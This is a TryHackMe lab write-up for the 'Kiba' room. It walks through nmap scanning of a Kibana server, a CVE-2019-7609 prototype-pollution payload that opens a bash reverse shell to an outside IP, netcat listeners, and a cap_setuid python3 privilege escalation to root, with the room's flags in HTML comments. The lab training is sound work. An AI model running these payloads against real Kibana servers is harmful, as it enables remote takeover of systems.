# About

This is a writeup for the [Kiba room on TryHackMe](https://tryhackme.com/room/kiba). The writeup contains step-by-step guide and some reading materials.
## Questions
### What is the vulnerability that is specific to programming languages with prototype-based inheritance?
**Answer**: Prototype pollution

[Read more](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)


### What is the version of visualization dashboard installed in the server?
```
nmap -p- 10.10.30.229
```
Output is as follows:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5044/tcp open  lxi-evntsvc
5601/tcp open  esmagent
```

```
nmap -sC -sV -p 5044, 5601 10.10.30.229
```
Output is as follows:
```
PORT     STATE SERVICE      VERSION
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Sun, 30 Aug 2020 10:14:23 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest:
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Sun, 30 Aug 2020 10:14:22 GMT
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Sun, 30 Aug 2020 10:14:22 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.80%I=7%D=8/30%Time=5F4B7BFE%P=x86_64-apple-darwin17.7.
SF:0%r(GetRequest,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kiban
SF:a\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab
SF:54e3e6c\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnec
SF:tion:\x20close\r\nDate:\x20Sun,\x2030\x20Aug\x202020\x2010:14:22\x20GMT
SF:\r\n\r\n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-n
SF:ame:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\
SF:ncontent-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\
SF:x20no-cache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x
SF:20Sun,\x2030\x20Aug\x202020\x2010:14:22\x20GMT\r\n\r\n{\"statusCode\":4
SF:04,\"error\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\n\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%
SF:r(SSLSessionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Term
SF:inalServerCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLS
SF:SessionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,
SF:1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\
SF:x20Not\x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d
SF:04923283ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=
SF:utf-8\r\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnect
SF:ion:\x20close\r\nDate:\x20Sun,\x2030\x20Aug\x202020\x2010:14:23\x20GMT\
SF:r\n\r\n{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not
SF:\x20Found\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r
SF:\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOpti
SF:ons,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
```

Kibana could be reached via: http://10.10.30.229:5601/app/kibana

### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000
CVE-2019-7609

### Compromise the machine and locate user.txt
Nice payload is taken from [here](https://github.com/mpgn/CVE-2019-7609):
```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/10.9.133.40/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.9.133.40/12345 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

```
ncat -vlp 12345
nc -lv 12345
```

Inside the machine:
```
kiba@ubuntu:/home/kiba/kibana/bin$ cat ~/user.txt
```
<!--The flag is **THM{1s_easy_pwn3d_k1bana_w1th_rce}**-->

### Capabilities is a concept that provides a security system that allows "divide" root privileges into different values
Nice [reading](https://www.incibe-cert.es/en/blog/linux-capabilities-en)

[Capability-based security](https://en.wikipedia.org/wiki/Capability-based_security)

### How would you recursively list all of these capabilities?
```
getcap -r /
```
Interesting part of the output is:
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

### Escalate privileges and obtain root.txt
[Reading article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
So, we gave a capability to python3 to set uid. if we set it to 0, it is root.

```
kiba@ubuntu:/$ cd /home/kiba/.hackmeplease
```
The directory contains **python3**
```
kiba@ubuntu:/home/kiba/.hackmeplease$ ls
```
Set up a uid to 0.
```
kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
system("/bin/bash")' os; os.setuid(0); os.
```
Now we can check whether we are root with the help of *whoami* command:
```
whoami
```
Now we can go to */root* directory
```
cd /root
```
The */root* directory contains root.txt file.
```
cat root.txt
```

<!--**The flag** is THM{pr1v1lege_escalat1on_us1ng_capab1l1t1es}-->
